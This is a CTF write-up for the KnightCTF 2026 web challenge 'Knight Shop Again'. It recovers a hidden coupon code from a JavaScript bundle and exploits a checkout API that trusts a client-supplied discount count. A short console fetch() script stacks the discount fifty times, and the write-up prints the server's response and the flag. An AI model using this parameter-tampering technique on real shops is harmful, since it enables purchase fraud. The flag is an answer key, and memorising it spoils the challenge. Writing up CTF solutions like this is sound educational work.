# **Writeup: Knight Shop Again**

CTF: KnightCTF 2026  
Category: Web / API  

## **Description**

A modern e-commerce platform for medieval equipment. The goal is to purchase items, but the flag is only given upon a successful "special" purchase (implied to be getting the total to near zero or using a specific exploit).

## **Reconnaissance & Analysis**

The challenge provided a React-based web application. By inspecting the source code (specifically the main JS bundle), we identified the logic handling the shopping cart and checkout process.

### **1\. Reverse Engineering the Coupon Code**

In the source code, a validation function checked the coupon input against specific ASCII values:

* Prefix: \[75, 78, 73, 71, 72, 84\] $\\rightarrow$ **KNIGHT**  
* Suffix: \[50, 53\] $\\rightarrow$ **25**

**Recovered Coupon:** KNIGHT25

### **2\. Analyzing the Discount Logic**

The cart calculation logic revealed a critical implementation detail:

JavaScript

const v \= m \* Math.pow(0.75, u);

* m: Total price.  
* u: discountCount (Number of times the coupon is applied).  
* 0.75: Represents a 25% discount.

This formula allows for exponential discount stacking. If we apply the coupon multiple times, the price approaches zero.

### **3\. Identifying the Vulnerability**

The application attempted to prevent multiple uses of the coupon via a client-side check using a cookie named promo\_applied. However, the actual checkout request sent the discountCount as a parameter in the JSON body:

JSON

{  
  "discountCode": "KNIGHT25",  
  "discountCount": 1  
}

The server implicitly trusts this discountCount parameter without validating if the user actually applied the coupon that many times legitimately. This is a classic **Mass Assignment / Parameter Tampering** vulnerability.

## **Exploitation**

To exploit this, we bypassed the client-side cookie restriction entirely by interacting directly with the API.

### **Attack Vector**

We intercepted the checkout request and modified the discountCount to a high number (e.g., 50), which reduced the total price to a fraction of a cent, allowing the purchase to succeed within the default user balance.

**Exploit Script (Console):**

JavaScript

fetch('/api/checkout', {  
    method: 'POST',  
    headers: { 'Content-Type': 'application/json' },  
    body: JSON.stringify({  
        discountCode: 'KNIGHT25',  
        discountCount: 50 // Stacking the 25% discount 50 times  
    })  
})  
.then(res \=\> res.json())  
.then(console.log);

**Response:**

JSON

{  
  "balance": 49.99,  
  "flag": "KCTF{kn1ght\_c0up0n\_m4st3r\_2026}"  
}

## **Flag**

KCTF{kn1ght\_c0up0n\_m4st3r\_2026}

---

**Author:** MR. Umair   
**Date:** January 21, 2026  
**Competition:** KnightCTF 2026
